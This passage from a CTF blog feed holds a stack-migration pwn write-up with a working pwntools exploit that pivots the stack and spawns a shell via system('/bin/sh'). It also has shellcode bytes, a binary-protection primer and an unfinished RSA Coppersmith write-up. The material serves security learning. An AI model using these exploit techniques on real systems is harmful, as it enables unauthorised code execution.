number">9090909000007fff</span>   f <span class="token number">6</span> <span class="token number">9090909090909090</span>   f <span class="token number">7</span> <span class="token number">9090909090909090</span>   f <span class="token number">8</span> <span class="token number">9090909090909090</span>   f <span class="token number">9</span> b848686a90909090   f <span class="token number">10</span> <span class="token number">732f2f2f6e69622f</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg<span class="token operator">></span> </code></pre><p><code>Exp Running Status</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190719161033.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Binary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary </tag>
            
            <tag> Overflow </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ciscn_Pwn_Stack_Migration</title>
      <link href="/2019/07/18/Ciscn-Pwn-Stack-Migration/"/>
      <url>/2019/07/18/Ciscn-Pwn-Stack-Migration/</url>
      
        <content type="html"><![CDATA[<p>Stack migration in Ciscn…</p><a id="more"></a><h1 id="Ciscn-Pwn-Stack-Migration"><a href="#Ciscn-Pwn-Stack-Migration" class="headerlink" title="Ciscn_Pwn_Stack_Migration"></a>Ciscn_Pwn_Stack_Migration</h1><h2 id="Main-Source-Code"><a href="#Main-Source-Code" class="headerlink" title="Main Source Code"></a>Main Source Code</h2><p>main:</p><pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> <span class="token punctuation">;</span> <span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span>                 public main<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> main            proc near               <span class="token punctuation">;</span> DATA XREF<span class="token punctuation">:</span> _start<span class="token operator">+</span><span class="token number">17</span>↑o<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> var_4           <span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> argc            <span class="token operator">=</span> dword ptr  <span class="token number">8</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> argv            <span class="token operator">=</span> dword ptr  0Ch<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> envp            <span class="token operator">=</span> dword ptr  10h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> <span class="token punctuation">;</span> __unwind <span class="token punctuation">{</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span>                 lea     ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048603</span>                 and     esp<span class="token punctuation">,</span> 0FFFFFFF0h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048606</span>                 push    dword ptr <span class="token punctuation">[</span>ecx<span class="token number">-4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048609</span>                 push    ebp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804860A                 mov     ebp<span class="token punctuation">,</span> esp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804860C                 push    ecx<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804860D                 sub     esp<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048610</span>                 call    init<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048615</span>                 sub     esp<span class="token punctuation">,</span> 0Ch<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048618</span>                 push    offset s        <span class="token punctuation">;</span> <span class="token string">"Welcome, my friend. What's your name?"</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804861D                 call    _puts<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048622</span>                 add     esp<span class="token punctuation">,</span> 10h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048625</span>                 call    vul<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804862A                 mov     eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0804862F</span>                 mov     ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048632</span>                 leave<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048633</span>                 lea     esp<span class="token punctuation">,</span> <span class="token punctuation">[</span>ecx<span class="token number">-4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span>                 retn<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span> <span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// starts at 80485FF</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span> main            endp<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span></code></pre><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome, my friend. What's your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>vul:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x30u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x30u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Exploit-Script"><a href="#Exploit-Script" class="headerlink" title="Exploit Script"></a>Exploit Script</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># buf_size = 0x28</span><span class="token comment" spellcheck="true"># read_size = 0x30</span><span class="token comment" spellcheck="true"># buf_addr = ebp - 0x28</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># vul loop1:</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'good boy1'</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b *vul+104'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804b000</span><span class="token operator">-</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vul'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">''' Program Status──────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────── EAX  0x30 EBX  0x0 ECX  0xfff9442c ◂— 'Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n' EDX  0xf7ee2890 ◂— 0x0 EDI  0xf7ee1000 ◂— 0x1d9d6c ESI  0xf7ee1000 ◂— 0x1d9d6c EBP  0xfff969a8 —▸ 0x804af00 ◂— 0x0 ESP  0xfff96980 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' EIP  0x80485fd (vul+104) ◂— leave  ───────────────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────────────   0x80485ee &lt;vul+89>     push   eax   0x80485ef &lt;vul+90>     push   0x80486ca   0x80485f4 &lt;vul+95>     call   printf@plt &lt;0x80483e0>   0x80485f9 &lt;vul+100>    add    esp, 0x10   0x80485fc &lt;vul+103>    nop     ► 0x80485fd &lt;vul+104>    leave     0x80485fe &lt;vul+105>    ret       0x80485ff &lt;main>       lea    ecx, dword ptr [esp + 4]   0x8048603 &lt;main+4>     and    esp, 0xfffffff0   0x8048606 &lt;main+7>     push   dword ptr [ecx - 4]   0x8048609 &lt;main+10>    push   ebp────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp  0xfff96980 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'... ↓──────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────── ► f 0  80485fd vul+104─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Breakpoint *vul+104pwndbg> stack 2000:0000│ esp  0xfff96980 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'... ↓0a:0028│ ebp  0xfff969a8 —▸ 0x804af00 ◂— 0x00b:002c│      0xfff969ac —▸ 0x804859b (vul+6) ◂— sub    esp, 4'''</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''**********Notes*************{???} means a program address random....{==>} means point to....{&lt;= } means value at the address'''</span><span class="token triple-quoted-string string">'''*********cover ebp**********ebp = ??? ==> 0x804af00 &lt;= 0'''</span><span class="token triple-quoted-string string">'''***** hijacking ebp and cover return address to vul+6 ******leave:     mov esp,ebp ;            esp = ??? ==>0x804af00 &lt;= 0    pob ebp ;                     esp = ???+4 ;         ebp = 0x804af00 &lt;=0ret vul+6;'''</span><span class="token comment" spellcheck="true">#vul loop2:</span><span class="token comment" spellcheck="true">#gadget</span>leave_ret <span class="token operator">=</span> <span class="token number">0x80484b8</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'good boy2'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804aed8</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/bin/sh\0'</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804aed4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b *vul+104'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''******** send payload ********1.buf_addr = ebp - 0x28 = 0x804af00 - 0x28 = 0x804aed82.(0x804aed8 + 0x10 = 0x804aef8) This value was writed in 0x 804aef0...It means that args point to '/bin/sh' at 0x804aef8...3.ebp = 0x804af00 ==> 0x804aed4 &lt;= 04.leave:        mov esp,ebp:            esp = 0x804af00 ==> 0x804aed4 &lt;= 0 ;         pop ebp:            esp = 0x804af04 ==> leave_ret;            ebp = 0x804aed4;5.ret leave_ret'''</span><span class="token triple-quoted-string string">'''******* leave_ret*********leave:    mov esp,ebp:        esp = 0x804aed4 &lt;= 0;    pop ebp:        esp = 0x804aed8 ==> system        ebp = 0x0;ret system('/bin/sh');----------------------------------------------------------------------------pwndbg> stack 3000:0000│ esp  0x804aed8 —▸ 0x8048400 (system@plt) ◂— jmp    dword ptr [0x804a018]01:0004│      0x804aedc ◂— 0x002:0008│      0x804aee0 —▸ 0x804aee8 ◂— '/bin/sh'03:000c│      0x804aee4 ◂— 0x004:0010│      0x804aee8 ◂— '/bin/sh'05:0014│      0x804aeec ◂— 0x68732f /* '/sh' */06:0018│      0x804aef0 ◂— 0x0... ↓0a:0028│      0x804af00 —▸ 0x804aed4 ◂— 0x00b:002c│      0x804af04 —▸ 0x80484b8 (deregister_tm_clones+40) ◂— leave  0c:0030│      0x804af08 ◂— 0x0------------------------------------------------------------------------------'''</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Mind：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190719201500.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Ciscn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Binary_Security_Guidance</title>
      <link href="/2019/07/18/Binary-Security-Guidance/"/>
      <url>/2019/07/18/Binary-Security-Guidance/</url>
      
        <content type="html"><![CDATA[<p>Here is a summary of knowledge points for binary security. The reason for this article is that I can learn binary security specifically😄.</p><a id="more"></a><p>[TOC]</p><h1 id="✉Binary-Security-Guidance"><a href="#✉Binary-Security-Guidance" class="headerlink" title="✉Binary_Security_Guidance"></a>✉Binary_Security_Guidance</h1><blockquote><p>Binary security refers to guaranteeing the information security of binary data when transmitting data, that is, not being tampered with, decoded and so on. If attacked, it can be detected in time.</p><p>Binary security includes some things of cryptography, such as encryption and decryption, signature and so on.</p><p>In <code>CTF</code> competitions, binary security usually appear in the form of <code>reverse</code> and <code>pwn</code>. You will get a compiled program to analyze its logic and then crack it.</p></blockquote><h2 id="📖Linux-Pwn"><a href="#📖Linux-Pwn" class="headerlink" title="📖Linux Pwn"></a>📖Linux Pwn</h2><blockquote><p>Cause pwn of linux is normally favorite example form now. So i decide to start pwn from linux platform.</p></blockquote><h3 id="Security-protection-mechanism"><a href="#Security-protection-mechanism" class="headerlink" title="Security protection mechanism"></a>Security protection mechanism</h3><blockquote><p>In the linux, we can use instructions called <code>checksec</code> to see the security protection mechanism of our target program. So the first we should know is kinds of protection mechanism.</p></blockquote><p> <img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190718144432.png" alt=""></p><h4 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h4><blockquote><p>Canary is a kind of protection technique to mitigate stack overflow.</p><p>You can set the canary by following args.</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#Quoted From CTF-WIKI</span><span class="token comment" spellcheck="true">#enables protection, but only inserts protection for functions that have arrays in local variables</span>-fstack-protector <span class="token comment" spellcheck="true">#Enable protection, insert protection for all functions</span>-fstack-protector-all -fstack-protector-strong<span class="token comment" spellcheck="true">#Only protects functions with explicit stack_protect attribute</span>-fstack-protector-explicit <span class="token comment" spellcheck="true">#Disable protection.</span>-fno-stack-protector </code></pre><p>Here is a example to understand what role canary play.</p><pre class=" language-bash"><code class="language-bash">        High        Address <span class="token operator">|</span>                 <span class="token operator">|</span>                +-----------------+                <span class="token operator">|</span> args            <span class="token operator">|</span>                +-----------------+                <span class="token operator">|</span> <span class="token keyword">return</span> address  <span class="token operator">|</span>                +-----------------+        rbp <span class="token operator">=</span><span class="token operator">></span>  <span class="token operator">|</span> old ebp         <span class="token operator">|</span>                +-----------------+      rbp-8 <span class="token operator">=</span><span class="token operator">></span>  <span class="token operator">|</span> canary value    <span class="token operator">|</span>                +-----------------+<span class="token operator">|</span> Local variables <span class="token operator">|</span>        Low     <span class="token operator">|</span>                 <span class="token operator">|</span>        Address</code></pre><p>The canary value is usually stored in <code>TLS==&gt;fs:[0x28]</code>, this value is also called <code>stack_guard</code>. If the canary value was changed illegally, the program flow will go to a func called <code>__stack_chk_fail</code> in glibc. And then you can’t crack the program as you think, it will prevent the easy stack overflow.(PS: Bypass Canary will be talked later…)</p><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><blockquote><p>Nx(No Excute) enabled means instructions in stack won’t be allowed to execute. Normally attack ways like <code>call esp</code> and <code>jmp esp</code> will out of action. But we can use ROP technique to bypass NX. </p></blockquote><h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><blockquote><p>RELRO, this kind of protection mechanism has two form: <code>Partial RELRO</code> and <code>Full RELRO</code>. If program was Full RELRO, we wouldn’t change the <code>Got-table</code>.</p></blockquote><h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><blockquote><p>PIE（position-independent executable） enabled means program’s memory address is random while running the program each time.</p><p>The basic address is 0x400000 when program’s status is <code>No-PIE</code>.</p></blockquote><h4 id="RWX"><a href="#RWX" class="headerlink" title="RWX"></a>RWX</h4><blockquote><p>Has RWX(Read&amp;Write&amp;Execute) segments means program has some segments you have the power to read, write and execute.</p><p>You can try to understand it by following picture:</p></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190718153217.png" alt=""></p><h3 id="Common-Attack-Ways"><a href="#Common-Attack-Ways" class="headerlink" title="Common Attack Ways"></a>Common Attack Ways</h3><blockquote><p>So what we should learn then? It’s no denying we should aim at understanding basic principles of common attack ways. </p></blockquote><ul><li>Stack overflow</li><li>Format string vulnerability</li><li>Glibc Heap uses</li><li>IO_FILE uses</li><li>Conditional competition</li><li>Integer overflow</li><li>Sandbox escape</li><li>Linux Kernel</li><li>Others Framework(like arm,arch)</li></ul><h2 id="📖Reverse"><a href="#📖Reverse" class="headerlink" title="📖Reverse"></a>📖Reverse</h2><p>later…</p><h2 id="⏱Concluding-remarks"><a href="#⏱Concluding-remarks" class="headerlink" title="⏱Concluding remarks"></a>⏱Concluding remarks</h2><p>Fighting or losing, depend on yourself😀.</p>]]></content>
      
      
      <categories>
          
          <category> Binary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019强网杯_Copperstudy</title>
      <link href="/2019/05/29/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-Copperstudy/"/>
      <url>/2019/05/29/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-Copperstudy/</url>
      
        <content type="html"><![CDATA[<p>一道RSA过一遍各种攻击。</p><a id="more"></a><p>[TOC]</p><h1 id="🚩2019强网杯-Copperstudy"><a href="#🚩2019强网杯-Copperstudy" class="headerlink" title="🚩2019强网杯_Copperstudy"></a>🚩2019强网杯_Copperstudy</h1><blockquote><p>😭卡在第五关，一看wp发现少copy了一个n，以为有n和m两个未知数（ps:sage真强大）。</p></blockquote><h2 id="✅Challenge-0"><a href="#✅Challenge-0" class="headerlink" title="✅Challenge 0"></a>✅Challenge 0</h2><p>只需爆破得出skr的值，这是门槛。</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>proof<span class="token punctuation">:</span> skr<span class="token operator">=</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>skr<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>a904dcc09fcdc1d641905b0b50513922c94ad030223cf8eb3bbaa9b21b6788a5<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>skr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#------------step 1</span>cipher <span class="token operator">=</span> <span class="token string">''</span>skr_part <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">for</span> a <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> skr_part <span class="token operator">+</span> chr<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span>c<span class="token punctuation">)</span>            result <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(result)</span>            <span class="token keyword">if</span>  result <span class="token operator">==</span> cipher<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="✅Challenge-1"><a href="#✅Challenge-1" class="headerlink" title="✅Challenge 1"></a>✅Challenge 1</h2><p>密文高位已知，未知低比特攻击。</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">1</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x5ab3c00a116dc6834ed79ad55036f3a81cf7d4cb41098118ca9efe1ccff298b951259a668da68c607e0ed85db54ac5243aaa380f0259e67f05a13de2b5f1e081c47e03d3cd785ccc182b316d87ac2be82a34dee2af8814dc70b55d33c1b5a7c300f07ba8a1086aaac63da37b234842661e971f533d65dacce3b477eb1232efb5L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x41522844c262cd5e8c5d3064d1719131ba1803f6e35b3ad4c5838f758dcdc7201e296b3966bad4839b280017af8c788a13702a99aa0faddc4588c0091e3a728825e6b022dc1c3c9ec06a00cb54454e280daacd81ef822ee362d09d0ecb798d15e20918173aefe733b40b533205996de6a6ab3650827662065c03985e2dc6266aL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">>></span><span class="token number">72</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">72</span><span class="token punctuation">)</span><span class="token operator">=</span>0x765a5c92257d16f953ce13eb83bb338727e1eff15a5f4e75251f9d82e719620a008f88d5946a943963d403e1bf395ce6b8b93edcadb503000000000000000000L<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python">e <span class="token operator">=</span> <span class="token number">0x3</span>b <span class="token operator">=</span> 0x9e67d3a220a3dcf6fc4742052621f543b8c78d5d9813e69272e65ac676672446e5c88887e8bfdfc92ec87ec74c16350e6b539e3bd910b000000000000000000Ln <span class="token operator">=</span> 0xa1888c641a05aeb81b3d1686317a86f104791fe1d570a5b11209f45d09ea401d255a70744e7a2d39520e359c23a9f1209ee47f496dbd279e62ee1648b3a277ced8825298274322e0a7a86deea282676310a73b6bb946fc924c34ac6c8784ff559bf9a004c03fb167ef54aaea90ce587f2f3074b40d7f632022ec8fb12e659953Lc<span class="token operator">=</span>0x93145ece45f416a11e5e9475518f165365456183c361500c2f78aff263028c90f20b7d97205f54e21f3bcc8a556b457889fde3719d0a0f9c9646f3f0d0a1e4bee0f259f023168fe8cc0511848c1635022fcc20b6088084585e2f8055a9d1b1d6bdb228087900bf7c6d42298f8e45c451562c816e2303990834c94e580bf0cbd1L<span class="token comment" spellcheck="true">#72bits未知</span>kbits<span class="token operator">=</span><span class="token number">72</span>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token operator">-</span>cx0 <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"x: %s"</span> <span class="token operator">%</span>hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>x0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 765a5c92257d16f953ce13eb83bb338727e1eff15a5f4e75251f9d82e719620a008f88d5946a943963d403e1bf395ce6b8b93edcadb503750332f65eeb1e19a8</span></code></pre><h2 id="✅Challenge-2"><a href="#✅Challenge-2" class="headerlink" title="✅Challenge 2"></a>✅Challenge 2</h2><p>已知部分因数高Bit，未知低比特攻击。</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">2</span><span class="token punctuation">[</span><span class="token 